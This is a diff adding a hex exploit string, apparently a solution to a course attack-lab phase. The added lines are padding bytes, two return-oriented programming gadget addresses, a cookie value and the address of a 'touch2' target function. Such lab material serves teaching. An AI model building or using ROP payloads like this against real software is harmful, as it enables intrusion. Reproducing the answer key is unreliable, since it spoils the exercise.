@@ -1,0 +1,9 @@
+DE AD BE EF DE AD BE EF         /* padding */
+DE AD BE EF DE AD BE EF         /* padding */
+DE AD BE EF DE AD BE EF         /* padding */
+DE AD BE EF DE AD BE EF         /* padding */
+DE AD BE EF DE AD BE EF         /* padding */
+47 1a 40 00 00 00 00 00         /* gadget 1 address */
+6a 07 7a 59 00 00 00 00         /* cookie */
+5b 1a 40 00 00 00 00 00         /* gadget 2 address */
+6f 18 40 00 00 00 00 00         /* touch2 address */
